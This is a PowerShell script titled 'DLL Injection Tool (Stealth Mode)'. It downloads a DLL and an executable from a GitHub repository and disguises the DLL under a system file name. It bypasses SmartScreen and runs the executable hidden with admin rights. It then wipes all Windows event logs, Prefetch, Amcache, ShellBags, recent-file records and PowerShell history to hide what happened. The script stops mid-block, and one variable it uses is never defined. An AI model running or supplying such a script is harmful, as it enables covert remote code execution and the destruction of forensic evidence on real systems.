# ================================
# DLL Injection Tool (Stealth Mode)
# ================================

# STEP 0: Download DLL and rename it to d3dcompiler_47.dll

# Define source URL and initial download path
$dllUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/badmos-gabber.dll"
$originalPath = "D:\virtualbox\KaliLinux\Logs\badmos-gabber.dll"
$renamedPath = "D:\virtualbox\KaliLinux\Logs\d3dcompiler_47.dll"

# Download the DLL
Invoke-WebRequest -Uri $dllUrl -OutFile $originalPath -UseBasicParsing

# Rename the DLL
Rename-Item -Path $originalPath -NewName "d3dcompiler_47.dll" -Force


# Create directory if it doesn't exist
$dir = Split-Path $dllPath
if (-not (Test-Path $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
}

# Download the DLL
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue

# Wait for 2 seconds
Start-Sleep -Seconds 2

# STEP 1: Define GitHub EXE URL & Temp Path
$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/audio.dg.exe"
$tempPath = "$env:TEMP\ConsoleApplication6.exe"

# STEP 2: Download the EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing -ErrorAction SilentlyContinue

# STEP 3: Unblock to prevent SmartScreen
Unblock-File -Path $tempPath -ErrorAction SilentlyContinue

# STEP 4: Run the EXE silently as admin
$proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb RunAs -PassThru
$proc.WaitForExit()

# STEP 5: Remove EXE after injection
Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue

# Delete the DLL if it exists
$dllToDelete = "D:\virtualbox\KaliLinux\Logs\d3dcompiler_47.dll"
if (Test-Path $dllToDelete) {
    Remove-Item -Path $dllToDelete -Force
}

# STEP 6: Stealth Cleanup Logs
Start-Job -ScriptBlock {
    try {
        # Clear Windows Event Logs
        wevtutil el | ForEach-Object { wevtutil cl $_ } > $null 2>&1

        # Delete Prefetch
        Remove-Item -Path "$env:SystemRoot\Prefetch\*" -Force -ErrorAction SilentlyContinue

        # Clear Amcache (Program execution history)
        Remove-Item -Path "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue

        # Clear Run Dialog history
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

        # Clear Recent files
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue

        # Clear ShellBags
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}
} | Out-Null
# STEP 7: Clear PowerShell history
try {
    # Clear in-memory history
    [System.Management.Automation.PSConsoleReadLine]::ClearHistory() 2>$null

    # Clear history file on disk
    $historyFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if (Test-Path $historyFile) {
        Remove-Item -Path $historyFile -Force -ErrorAction SilentlyContinue
    }
